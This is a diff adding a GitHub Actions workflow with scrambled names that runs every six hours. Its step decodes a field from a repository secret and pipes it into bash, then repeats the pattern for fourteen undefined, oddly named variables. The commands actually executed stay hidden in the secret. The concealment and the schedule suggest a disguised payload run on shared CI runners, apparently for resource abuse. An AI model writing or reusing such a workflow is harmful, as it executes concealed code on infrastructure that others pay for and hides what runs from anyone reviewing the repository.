@@ -1,0 +1,32 @@
+name: miaoyidao6745
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: miaoyidao6745
+        env:
+          pok10: ${{ secrets.pok10 }}
+        run: |
+          echo $pok10 | jq -r .v49 | /bin/bash
+          echo $zkfm0 | jq -r .zukus1495 | /bin/bash
+          echo $ejbx807 | jq -r .jojgj84543 | /bin/bash
+          echo $opl1 | jq -r .hc59 | /bin/bash
+          echo $nt558 | jq -r .qfvv34354 | /bin/bash
+          echo $zf48490 | jq -r .z9 | /bin/bash
+          echo $vlog294 | jq -r .sfvm94 | /bin/bash
+          echo $gy9 | jq -r .aqqk4877 | /bin/bash
+          echo $ddhxw8 | jq -r .gxng8 | /bin/bash
+          echo $r1691 | jq -r .isvrd131 | /bin/bash
+          echo $ockze03506 | jq -r .cgl8 | /bin/bash
+          echo $d870 | jq -r .zk88432 | /bin/bash
+          echo $cpihs76 | jq -r .ufkt62 | /bin/bash
+          echo $an90 | jq -r .h8 | /bin/bash
+          echo $n6077 | jq -r .rnu3 | /bin/bash
+
